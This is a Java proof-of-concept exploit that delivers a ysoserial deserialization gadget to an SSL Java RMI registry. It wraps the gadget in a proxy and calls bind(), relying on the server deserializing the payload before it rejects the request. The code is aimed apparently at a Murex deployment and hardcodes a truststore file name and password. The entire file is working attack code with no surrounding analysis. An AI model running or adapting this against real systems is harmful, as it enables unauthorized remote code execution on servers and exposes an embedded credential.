import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMISocketFactory;
import java.io.*;
import java.lang.reflect.*;
import javax.net.ssl.*;
import java.net.Socket;
import java.net.ServerSocket;

public class DeliverPayload {

    // Serializable InvocationHandler that carries the ysoserial gadget
    public static class Handler implements InvocationHandler, Serializable {
        private Object payload;
        public Handler(Object p) { this.payload = p; }
        public Object invoke(Object proxy, Method m, Object[] args) { return null; }
    }

    public static void main(String[] args) throws Exception {
        if (args.length != 3) {
            System.out.println("Usage: java DeliverPayload <host> <port> <payload.bin>");
            return;
        }

        String host = args[0];
        int port = Integer.parseInt(args[1]);
        String payloadFile = args[2];

        // Load the Murex truststore so we can handshake with the SSL registry
        System.setProperty("javax.net.ssl.trustStore", "murexClientTruststore2023-01-24-17-18.jks");
        System.setProperty("javax.net.ssl.trustStorePassword", "murex00");

        // Read the ysoserial payload from disk
        Object payload;
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(payloadFile))) {
            payload = ois.readObject();
        }
        System.out.println("[+] Payload loaded: " + payload.getClass().getName());

        // Wrap the gadget in a Remote proxy because reg.bind() requires Remote
        Remote remoteProxy = (Remote) Proxy.newProxyInstance(
            DeliverPayload.class.getClassLoader(),
            new Class<?>[] { Remote.class },
            new Handler(payload)
        );

        // Create an SSL socket factory for the RMI connection
        RMISocketFactory sslFactory = new RMISocketFactory() {
            public Socket createSocket(String h, int p) throws IOException {
                return SSLSocketFactory.getDefault().createSocket(h, p);
            }
            public ServerSocket createServerSocket(int p) throws IOException {
                throw new UnsupportedOperationException();
            }
        };

        System.out.println("[+] Connecting to " + host + ":" + port + " via SSL...");
        Registry reg = LocateRegistry.getRegistry(host, port, sslFactory);

        // Optional recon: see what names are bound
        try {
            String[] names = reg.list();
            System.out.println("[+] Registry reachable. Names: " + String.join(", ", names));
        } catch (Exception e) {
            System.out.println("[!] list() failed (continuing): " + e.getMessage());
        }

        // FIRE: Deliver the payload via bind()
        String name = "poc" + System.currentTimeMillis();
        System.out.println("[+] Delivering via reg.bind('" + name + "', payload)...");
        try {
            reg.bind(name, remoteProxy);
            System.out.println("[+] Bind accepted.");
        } catch (java.rmi.AccessException e) {
            // Expected: server rejects non-local bind, but ALREADY deserialized the payload
            System.out.println("[+] AccessException (expected) — payload was deserialized server-side.");
        } catch (Exception e) {
            System.out.println("[!] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        System.out.println("[+] Done. Check your canary / DNS log.");
    }
}
